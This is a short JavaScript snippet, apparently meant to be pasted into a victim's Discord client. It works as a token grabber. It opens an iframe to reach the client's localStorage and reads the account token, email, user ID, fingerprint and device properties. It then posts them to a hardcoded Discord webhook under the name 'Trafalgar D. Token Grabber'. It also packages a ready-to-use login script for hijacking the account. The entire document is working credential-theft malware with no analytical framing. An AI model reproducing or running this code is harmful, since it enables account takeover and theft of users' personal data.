location.reload();
var discordWebhook = "https://discord.com/api/webhooks/934920642317414450/66SH242ydAj0mBqhyoTMhQnHj76OOE0lHGalAB0ZxOleR9Gs4ubu6O5WAXQ24A3AkP7H";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Trafalgar D. Token Grabber",
    avatar_url: "https://static.wikia.nocookie.net/onepiece/images/e/e9/Law%27s_Middle_Finger_Uncensored.png/revision/latest/scale-to-width-down/200?cb=20130621200933",
    content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));
